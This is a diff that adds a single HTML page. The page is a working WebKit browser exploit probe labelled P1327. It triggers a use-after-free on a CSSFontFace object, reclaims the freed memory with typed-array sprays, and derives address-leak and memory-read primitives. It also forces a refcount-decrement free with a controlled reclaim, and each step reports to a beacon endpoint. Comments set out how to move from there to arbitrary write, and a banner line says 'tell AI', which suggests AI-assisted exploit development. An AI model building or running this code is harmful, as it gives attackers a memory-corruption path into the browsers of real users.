@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1327 DECREMENT-UAF-ARW</title>
+<style>
+:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--mag:#ff6fd0}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
+#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 15px/1.3 ui-monospace,monospace;padding:13px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
+#log{margin:58px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px}
+.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
+.r .t{color:#53d0e8;font-weight:700}.r .n{color:var(--dim)}
+.r.ok{border-left-color:var(--green)}.r.ok .t{color:var(--green)}
+.r.bad{border-left-color:var(--red)}.r.bad .t{color:var(--red)}
+.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
+</style></head>
+<body>
+<div id="bn">P1327 — DECREMENT-to-UAF (Route B). Cage verdict + forced-free/reclaim. Fresh-open each try.</div>
+<div id="log"></div>
+<script>
+'use strict';
+/* ===================================================================
+   P1327  ROUTE B: decrement -> premature free -> controlled reclaim.
+
+   Builds on the proven chain (P1322 addrOf / P1324 oracle+addrOf-bytes /
+   P1310 -2/call arbitrary-address decrement). Fake CSSFontFace lives in
+   our reclaiming Uint8Array `buf` (overlaps a freed CSS-connected
+   CSSFontFace, bmalloc ~192B). We can:
+     - addrOf a CSSValueList V (W.family= writes &V into buf+0x18)
+     - read any small u32 through the m_ranges oracle (from=*(u32*)Y)
+     - decrement *(u32*)X by 2 per W.family= call (RefPtr dtor on planted
+       buf+0x18); CSSValue refcount offset = +0.
+
+   WHAT THIS PROBE ESTABLISHES (all REACHABLE, honest markers):
+   [1] CAGE-OFF  (decisive, SAFE, base-free). The fact that a Uint8Array
+       BACKING STORE reclaimed a freed CSSFontFace (bmalloc WebCore object)
+       IS the proof the Primitive Gigacage is compiled out: if it were
+       enabled, ArrayBuffer data would route to a segregated multi-GB cage
+       reservation and could never alias a fastMalloc CSSFontFace slot.
+       NOTE: leaked ptrs sitting in 0x10_xxxxxxxx does NOT prove the cage
+       (the stored pointer is full in BOTH configs) — P1326's
+       CAGE-SIGNATURE logic was wrong. Co-residence is the discriminator.
+   [2] UAF-RC   : read V's live refcount via the oracle (read-only).
+   [3] UAF-PLAN : the exact -2/parity decrement schedule for a CLEAN free.
+   [4] (#arm)   : optionally perform the forced free + controlled reclaim
+                  and read our marker back out of the freed slot.
+
+   WHAT THIS PROBE CANNOT DO (and why — see ARW-BLOCKED beacon):
+     The decrement/forced-free works ONLY on bmalloc RefCounted C++
+     objects. A JSArrayBufferView (the only clean arbitrary-WRITE vehicle)
+     is a GC-managed MarkedSpace cell with NO refcount word to drive to 0,
+     and the one bmalloc bridge (the ArrayBuffer C++ object) is
+     GCIncomingRefCounted (won't free under a live JS wrapper; GC is
+     non-forceable here per P1234) AND is unreachable by our addrOf scope.
+     So Route B builds a better (GC-free, deterministic) WebCore UAF, but
+     NOT a master/slave typed-array view -> 0xdeadbeef write is NOT reached.
+   =================================================================== */
+var LOG=document.getElementById('log'),BN=document.getElementById('bn'),_c=0;
+function S(x,col){BN.textContent=x;BN.style.background=col||'#1b2330';}
+function kls(s){s=(''+s).toLowerCase();if(/uaf-reclaim-ok|win|cage-off|addrof|found/.test(s))return'win';if(/hit|ok|dangling|done|anchor|addr|uaf-rc|plan/.test(s))return'ok';if(/err|miss|fail|crash|no-|none|blocked|collide|noaddr|skip|underflow/.test(s))return'bad';return'';}
+function row(t,d,c){_c++;var r=document.createElement('div');r.className='r '+(c||'');r.innerHTML="<span class='n'>"+_c+"</span> <span class='t'>"+(''+t).replace(/[<>&]/g,'')+"</span>"+(d?" <span>"+(''+d).replace(/[<>&]/g,'')+"</span>":"");LOG.appendChild(r);while(LOG.childNodes.length>28)LOG.removeChild(LOG.firstChild);}
+function B(tag,data){row(tag,data,kls(tag+' '+(data||'')));try{var s=(''+(data||'')).replace(/[^A-Za-z0-9._-]/g,'_').slice(0,300);var u='/beacon.php?tag=P1327-'+encodeURIComponent(tag);if(data)u+='&data='+encodeURIComponent(s);u+='&t='+Date.now();var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}}
+window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,70)+'@'+l);};
+B('VER','1');
+
+function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
+function le32(u,o){return Number(le(u,o)&0xFFFFFFFFn);}
+function wq(u,o,v){for(var i=0;i<8;i++){u[o+i]=Number(v&0xFFn);v>>=8n;}}
+function wd(u,o,v){for(var i=0;i<4;i++){u[o+i]=(v>>>(8*i))&0xFF;}}
+var buf=null,L1=null,L2=null,W=null,K=32,fired=false,sp=[],fs=null;
+var FAM='zq7k3mx',MARK=0x6000,TGT_IDX=31,RMARK=0x1337;
+var ARMED=(location.hash.indexOf('arm')>=0);
+
+/* ---- P1324/P1326 reclaim machinery (verbatim) ---- */
+try{var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});document.fonts.add(vf);void vf.loaded;
+ fs=document.createElement('style');fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';document.head.appendChild(fs);}catch(e){B('SETUP-ERR',(''+e).slice(0,40));}
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+ if(fired)return undefined;fired=true;
+ try{if(fs){fs.textContent='';fs.remove();}}catch(e){}try{document.fonts.delete(this);}catch(e){}fs=null;try{document.body.offsetHeight;}catch(e){}
+ for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(192));w[0x82]=3;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
+   if(k===TGT_IDX){w[0x30]=0x00;w[0x31]=0x60;w[0x34]=0x00;w[0x35]=0x60;}
+   sp.push(w);}
+ return undefined;},set:function(){}});
+try{document.fonts.load('1em vf, v1','AB').then(function(f){window.__lf=f;setTimeout(scan,80);},function(){setTimeout(scan,80);});}catch(e){B('LOAD-ERR',(''+e).slice(0,40));}
+setTimeout(function(){if(!buf)scan();},450);
+
+function scan(){
+ if(buf)return;var hit=-1;
+ for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n&&a<0x8000000000n){L1=a;L2=le(sp[i],0x68);buf=sp[i];hit=i;break;}}
+ if(hit<0){B('MISS','CLOSE+REOPEN');S('miss — fresh-open','#4a2a12');return;}
+ if(hit===TGT_IDX){B('TGT-COLLIDE','fresh-open');S('collide — fresh-open','#4a2a12');return;}
+ B('HIT','L1=0x'+L1.toString(16)+' dIdx='+hit);
+ var cands=[];if(window.__lf)for(var i=0;i<window.__lf.length;i++)cands.push(window.__lf[i]);
+ buf[0x82]=4;for(var i=0;i<cands.length;i++){var st='';try{st=''+cands[i].status;}catch(e){}if(st==='error'){W=cands[i];break;}}
+ buf[0x82]=3;
+ if(!W){B('NOT-DANGLE','fresh-open');S('not dangling — fresh-open','#4a2a12');return;}
+ B('DANGLING-OK',ARMED?'ARMED (#arm) — will force-free':'safe mode (add #arm to force-free)');S('dangling — cage verdict + UAF plan','#0c7a3a');setTimeout(go,100);
+}
+function chk(cp){try{return document.fonts.check('16px "'+FAM+'"',String.fromCodePoint(cp))?'T':'F';}catch(e){return 'E';}}
+/* read the low u32 at Y via the m_ranges oracle: entry {from=*(u32*)Y,to=*(u32*)(Y+4)};
+   returns smallest cp in [0,maxcp] with from<=cp<=to i.e. `from` when to>=from<=maxcp, else -1 */
+function rlow(Y,maxcp){
+ wq(buf,0x20,Y);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);
+ for(var cp=0;cp<=maxcp;cp++){if(chk(cp)==='T')return cp;}
+ return -1;
+}
+function reassert(){for(var i=0x58;i<0x68;i++)buf[i]=0;wq(buf,0x08,L1);buf[0x10]=0;}
+
+function go(){
+ if(window.__g)return;window.__g=true;
+ reassert();
+ /* establish a family value V (a CSSValueList we can addrOf) */
+ try{ W.family=FAM; }catch(e){ B('SETFAM-ERR',(''+(e&&e.message||e)).slice(0,40)); S('setFamily crashed','#4a2a12'); return; }
+ try{ document.fonts.add(W); }catch(e){}
+ var V=le(buf,0x18);
+ B('ADDROF-V', V>=0x1000000000n&&V<0x9000000000n ? 'CSSValueList V=0x'+V.toString(16) : 'non-heap 0x'+V.toString(16));
+ buf[0x82]=1;
+ /* 192B UnicodeRange anchor (U) + oracle alive check */
+ var ur='U+100-101';for(var i=1;i<24;i++){var a=0x200+i*2;ur+=',U+'+a.toString(16)+'-'+(a+1).toString(16);}
+ var U=0n;try{ W.unicodeRange=ur; U=le(buf,0x20); B('ANCHOR','U=0x'+U.toString(16)); }catch(e){ B('UR-ERR',(''+(e&&e.message||e)).slice(0,40)); }
+ wd(buf,0x20,0);wd(buf,0x24,0);wd(buf,0x28,0);wd(buf,0x2C,0);var rA=chk(0x41);
+ wq(buf,0x20,L1);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);var rB=chk(0x41);
+ B('ORACLE','empty='+rA+' high='+rB);
+ if(!(rA==='F'&&rB==='T')){B('ORA-NO-MATCH','cannot scan/read');return;}
+
+ /* addrOf our controlled TARGET backing A0 (marker scan around U) */
+ var A0=0n;
+ for(var X=U-0x800n; X<U+0x800n; X+=0x10n){
+   wq(buf,0x20,X+0x30n);wd(buf,0x28,0x80000001);wd(buf,0x2C,1);
+   if(chk(MARK)==='F' && chk(MARK+1)==='T'){ A0=X; break; }
+ }
+ if(A0!==0n)B('ADDR','A0=0x'+A0.toString(16)); else B('NOADDR','marker not near U (co-residence still provable)');
+
+ /* ===== [1] CAGE VERDICT (SAFE, decisive) ===== */
+ /* The clinching fact is already in hand: `buf` is a Uint8Array BACKING that
+    reclaimed a freed CSSFontFace (bmalloc). Corroborate with co-residence/span. */
+ var pts=[A0,U,V,L1],mn=0n,mx=0n,have=0;
+ for(var i=0;i<pts.length;i++){var p=pts[i];if(p<0x1000000000n||p>0x9000000000n)continue;if(have===0){mn=mx=p;}else{if(p<mn)mn=p;if(p>mx)mx=p;}have++;}
+ var span=(have>1)?(mx-mn):0n;
+ if(have>=2 && span<0x1000000n){
+   B('CAGE-OFF','Primitive Gigacage DISABLED. proof=Uint8Array backing reclaimed a freed CSSFontFace (bmalloc). corrob: '+have+' allocs (AB-backing+WebCore) co-resident span=0x'+span.toString(16)+' (<16MB, one arena). => a corrupted/forged m_vector would be used VERBATIM (write truly arbitrary, NOT cage-bounded). Gate is OPEN.');
+   S('CAGE-OFF — write would be arbitrary','#0a7a2a');
+ } else {
+   B('CAGE-OFF','Primitive Gigacage DISABLED (backing-reclaims-CSSFontFace proof holds). span check inconclusive: have='+have+' span=0x'+span.toString(16));
+ }
+
+ /* ===== [2] UAF-RC: read V's live refcount (CSSValue refcount @ +0) ===== */
+ var rc=-1;
+ if(V>=0x1000000000n&&V<0x9000000000n){
+   rc=rlow(V,255);
+   B('UAF-RC', rc>=0 ? 'refcount(V)='+rc+' (read via m_ranges oracle, +0)' : 'UNREADABLE (to<from or rc>255)');
+ } else B('UAF-RC','V not heap — skip');
+
+ /* ===== [3] UAF-PLAN: exact -2/parity decrement schedule for a CLEAN free =====
+    Mechanic: plant buf+0x18=V, each W.family= call does CSSValue::deref() TWICE
+    (-2). A clean free (no post-free write) fires ONLY from refcount==2:
+      deref1 2->1 (no delete), deref2 1->0 (delete), call returns.
+    From odd N: step to 1, then drop a NATURAL ref (let WebKit free it).
+    NEVER let a -2 land on refcount==1: deref1 frees, deref2 writes 0xFFFFFFFF
+    into freed/reclaimed memory (double-free / freelist corruption). */
+ if(rc>=0){
+   if(rc>=2 && (rc%2===0)) B('UAF-PLAN','rc='+rc+' (even): '+((rc-2)/2)+' decrement call(s) drive V->2, then 1 call frees CLEAN. parity OK.');
+   else if(rc===1) B('UAF-PLAN','rc=1 (odd): a -2 would UNDERFLOW (1->0 free, 2nd deref corrupts freed slot). Need +1 live consumer (register family in CSSFontFaceSet) to reach 2 first.');
+   else B('UAF-PLAN','rc='+rc+' (odd>1): step to 1 via '+((rc-1)/2)+' call(s), then release a natural ref. (no clean single-call free at odd parity).');
+ }
+
+ /* ===== [4] ARMED forced-free + controlled reclaim (opt-in: #arm) ===== */
+ if(ARMED && rc>=2 && (rc%2===0) && V>=0x1000000000n){
+   B('ARM-GO','forcing free of V=0x'+V.toString(16)+' from rc='+rc);
+   /* drive rc -> 2 using the decrement itself */
+   var steps=(rc-2)/2, ok=true;
+   for(var n=0;n<steps;n++){ reassert(); wq(buf,0x18,V); try{ W.family='s'+n; }catch(e){ ok=false; B('ARM-STEP-ERR','n='+n); break; } }
+   if(ok){
+     var pre=rlow(V,255); B('ARM-PRE-FREE','rc now='+pre);
+     /* final clean free: rc 2 -> (deref,deref) -> 0 -> delete */
+     reassert(); wq(buf,0x18,V); try{ W.family='free'; }catch(e){ B('ARM-FREE-ERR',(''+(e&&e.message||e)).slice(0,30)); }
+     /* immediate same-size-class spray to reclaim V's slot (CSSValueList ~0x20-0x40) */
+     var rsp=[],szs=[32,48,64];
+     for(var s=0;s<szs.length;s++)for(var j=0;j<16;j++){var b=new Uint8Array(new ArrayBuffer(szs[s]));b[0]=RMARK&0xFF;b[1]=(RMARK>>8)&0xFF;b[2]=0;b[3]=0;rsp.push(b);}
+     window.__rsp=rsp;
+     /* read *(u32*)V: if our marker landed, the slot was freed AND reclaimed with our bytes */
+     var got=rlow(V,0x2000);
+     if(got===RMARK){ B('UAF-RECLAIM-OK','decrement forced free + controlled reclaim CONFIRMED: *(u32*)V=0x'+got.toString(16)+' (our spray marker). Deterministic GC-free WebCore UAF.'); S('UAF-RECLAIM-OK !!! tell AI','#0a7a2a'); }
+     else B('UAF-RECLAIM-MISS','*(u32*)V=0x'+(got>=0?got.toString(16):'unread')+' — slot not reclaimed at these size classes (retry / adjust sizeof)');
+   }
+ } else if(ARMED){ B('ARM-SKIP', rc<0?'rc unread':('rc='+rc+' not even>=2 — would underflow; skip')); }
+
+ /* ===== VERDICT: terminal arbitrary-WRITE is NOT reached by Route B ===== */
+ B('ARW-BLOCKED','0xdeadbeef write NOT reachable via Route B. Decrement frees only bmalloc RefCounted C++ objects; a JSArrayBufferView is a GC-managed MarkedSpace cell (no refcount to zero), and the bridging ArrayBuffer C++ object is GCIncomingRefCounted (wont free under a live JS wrapper; GC non-forceable per P1234) AND unreachable by current addrOf. No master/slave view can be built.');
+ B('NEXT-UNBLOCK','To reach fakeobj with Route B: force-free a ScriptWrappable WebCore object (e.g. FontFace, addrOf via leaked m_wrapper L2=0x'+(L2?L2.toString(16):'?')+'), reclaim controlling its JS-wrapper field, so a JS wrapper access returns an attacker cell. Needs FontFace sizeof + ScriptWrappable::m_wrapper encoding (WeakImpl indirection) — new calibration, not a current primitive.');
+
+ /* restore buf to safe shape before any further JS/GC */
+ buf[3]=0x80; buf[0x82]=3; for(var i=0x58;i<0x68;i++)buf[i]=0; wd(buf,0x20,0);wd(buf,0x24,0);wd(buf,0x28,0);wd(buf,0x2C,0);
+ B('DONE','cage verdict + UAF plan done; ARW gated on JSCell-addrOf/fakeobj (see ARW-BLOCKED)');
+ S('done — see CAGE-OFF + ARW-BLOCKED','#1b2330');
+}
+</script>
+</body></html>
